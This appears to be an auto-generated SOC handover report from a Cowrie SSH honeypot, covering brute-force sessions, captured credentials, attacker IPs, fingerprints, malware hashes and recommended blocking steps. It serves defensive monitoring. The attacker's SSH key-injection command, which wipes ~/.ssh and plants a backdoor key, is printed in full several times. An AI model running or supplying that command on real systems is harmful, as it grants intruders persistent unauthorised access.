# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-28 |
| **Generated At** | 2026-04-28T22:59:36Z |
| **Shift Time** | 22:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **169** |
| Confirmed Threats | **113** |
| False Positives Filtered | **56** (33.1%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **12** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **165** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **93** |
| Unique Credential Pairs | **63** |
| Unique Usernames | **34** |
| Unique Passwords | **59** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 30 |
| `admin` | 7 |
| `root` | 4 |
| `test` | 4 |
| `postgres` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 7 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `123456As` | 2 |
| `P@ssw0rd123!` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `ubuntu` | `123456As` | 2 |
| `ubuntu` | `P@ssw0rd123!` | 2 |
| `info` | `admin` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Mg123` | `112.217.199.222` | 2026-04-28T21:18:37 |
| `root` | `3245gs5662d34` | `112.217.199.222` | 2026-04-28T21:18:41 |
| `root` | `admin!!!1` | `109.91.4.177` | 2026-04-28T22:04:27 |
| `root` | `3245gs5662d34` | `109.91.4.177` | 2026-04-28T22:04:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **169** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 87 |
| Go SSH scanner | 6 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 66 | 4 |
| `03a80b21afa8...` | Modern SSH client | 21 | 1 |
| `16443846184e...` | Generic scanner | 4 | 3 |
| `17a5327c6d98...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 66 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 21 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 4 | 3 | Generic scanner |
| `17a5327c6d98...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `109.91.4.177`, `112.217.199.222`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **15** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |
| `AS12322` | Free SAS | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS135918` | VIET DIGITAL TECHNOLOGY LIABILITY COMPANY | 1 | HIGH |
| `AS3209` | Vodafone GmbH | 1 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-248699b80d36

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-28 21:18 |
| **Last Seen** | 2026-04-28 21:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 21:18:33` | `cowrie.session.connect` |
| `2026-04-28 21:18:37` | `cowrie.client.version` |
| `2026-04-28 21:18:37` | `cowrie.client.kex` |
| `2026-04-28 21:18:37` | `cowrie.login.success` |
| `2026-04-28 21:18:37` | `cowrie.session.params` |
| `2026-04-28 21:18:37` | `cowrie.command.input` |
| `2026-04-28 21:18:37` | `cowrie.command.failed` |
| `2026-04-28 21:18:38` | `cowrie.log.closed` |
| `2026-04-28 21:18:38` | `cowrie.session.params` |
| `2026-04-28 21:18:38` | `cowrie.command.input` |
| `2026-04-28 21:18:38` | `cowrie.session.file_download` |
| `2026-04-28 21:18:38` | `cowrie.log.closed` |
| `2026-04-28 21:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad352cf44f3d

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-28 21:18 |
| **Last Seen** | 2026-04-28 21:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 21:18:40` | `cowrie.session.connect` |
| `2026-04-28 21:18:40` | `cowrie.client.version` |
| `2026-04-28 21:18:40` | `cowrie.client.kex` |
| `2026-04-28 21:18:41` | `cowrie.login.success` |
| `2026-04-28 21:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6630c89df042

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-04-28 22:04 |
| **Last Seen** | 2026-04-28 22:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 22:04:26` | `cowrie.session.connect` |
| `2026-04-28 22:04:26` | `cowrie.client.version` |
| `2026-04-28 22:04:26` | `cowrie.client.kex` |
| `2026-04-28 22:04:27` | `cowrie.login.success` |
| `2026-04-28 22:04:27` | `cowrie.session.params` |
| `2026-04-28 22:04:27` | `cowrie.command.input` |
| `2026-04-28 22:04:27` | `cowrie.command.failed` |
| `2026-04-28 22:04:27` | `cowrie.log.closed` |
| `2026-04-28 22:04:28` | `cowrie.session.params` |
| `2026-04-28 22:04:28` | `cowrie.command.input` |
| `2026-04-28 22:04:28` | `cowrie.session.file_download` |
| `2026-04-28 22:04:28` | `cowrie.log.closed` |
| `2026-04-28 22:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-924bce14c3a6

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-04-28 22:04 |
| **Last Seen** | 2026-04-28 22:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 22:04:30` | `cowrie.session.connect` |
| `2026-04-28 22:04:30` | `cowrie.client.version` |
| `2026-04-28 22:04:30` | `cowrie.client.kex` |
| `2026-04-28 22:04:31` | `cowrie.login.success` |
| `2026-04-28 22:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.91.4[.]177` | **30** | 2026-04-28 21:25 | 2026-04-28 22:07 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.221.28[.]214` | **30** | 2026-04-28 21:37 | 2026-04-28 22:11 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.161.170[.]12` | **21** | 2026-04-28 22:37 | 2026-04-28 22:57 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `157.51.24[.]209` | **8** | 2026-04-28 22:04 | 2026-04-28 22:18 | 16m | 0 | `T1592` | 🟢 LOW |
| `118.45.5[.]155` | **4** | 2026-04-28 22:18 | 2026-04-28 22:57 | 6m | 0 | `T1592` | 🟢 LOW |
| `177.86.139[.]52` | **4** | 2026-04-28 21:30 | 2026-04-28 21:38 | 8m | 0 | `T1592` | 🟢 LOW |
| `64.225.1[.]61` | **3** | 2026-04-28 22:14 | 2026-04-28 22:25 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `178.62.22[.]209` | **2** | 2026-04-28 22:16 | 2026-04-28 22:19 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.62.29[.]147` | **2** | 2026-04-28 22:16 | 2026-04-28 22:19 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.64.105[.]146` | **2** | 2026-04-28 21:29 | 2026-04-28 21:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.217.199[.]222` | 1 | 2026-04-28 21:18 | 2026-04-28 21:18 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.4.91[.]162` | 1 | 2026-04-28 21:31 | 2026-04-28 21:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-04-28 21:25 | 2026-04-28 21:25 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.225.1[.]61` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `178.62.29[.]147` | GB | DigitalOcean London | **100** ⚠️ | 0 |
| `178.62.22[.]209` | GB | DigitalOcean London | **100** ⚠️ | 7 |
| `20.64.105[.]146` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `109.91.4[.]177` | DE | Vodafone West GmbH | **100** ⚠️ | 50 |
| `103.161.170[.]12` | VN | HD86 International Trading Company Limited | **100** ⚠️ | 50 |
| `112.217.199[.]222` | KR | LG Uplus | **100** ⚠️ | 23 |
| `154.221.28[.]214` | HK | Yisu Cloud Ltd | **100** ⚠️ | 50 |
| `218.4.91[.]162` | CN | The Administrative of Trade Town, Changshu City | **100** ⚠️ | 38 |
| `177.86.139[.]52` | BR | SPACE NET WORLD TELECOM | **94** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 94 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 86 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (56 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 42 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 169 cases |
| Tool 34  | Credential Extractor        | ✅ 93 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 56 filtered (33.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 13 recon entry/entries in table (10 group(s) consolidating 106 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-28T22:59:36Z_
